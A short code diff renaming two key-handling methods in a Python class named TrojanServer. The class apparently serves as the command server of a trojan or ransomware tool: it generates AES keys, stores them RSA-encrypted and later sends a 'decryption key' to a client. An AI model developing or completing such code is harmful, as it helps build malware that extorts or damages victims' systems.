@@ -127,7 +127,7 @@ class TrojanServer:
         
         # option 2:
         
-        aes_key = self.generate_and_store_aes_key()
+        aes_key = self._generate_and_store_aes_key()
         protocol.send(self.conn, aes_key)
         
         data = protocol.receive(self.conn)
@@ -139,7 +139,7 @@ class TrojanServer:
         msg = "sending decryption key"
         protocol.send(self.conn, msg)
         
-        aes_key = self.retrieve_aes_key()
+        aes_key = self._retrieve_aes_key()
         protocol.send(self.conn, aes_key)
         
         msg = protocol.receive(self.conn)
@@ -156,14 +156,14 @@ class TrojanServer:
 
 
 
-    def generate_and_store_aes_key(self):
+    def _generate_and_store_aes_key(self):
         word = self.keys.get_random_word()
         aes_key = self.keys.generate_aes_key_from_secret_word(word)
         encrypted = self.keys.encrypt_aes_key_with_rsa(aes_key)
         self.db.save_aes_key_in_database(encrypted)
         return aes_key
 
-    def retrieve_aes_key(self):
+    def _retrieve_aes_key(self):
         encrypted_key = self.db.get_last_aes_key_from_database()
         aes_key = self.keys.decrypt_aes_key_with_rsa(encrypted_key)
         return aes_key
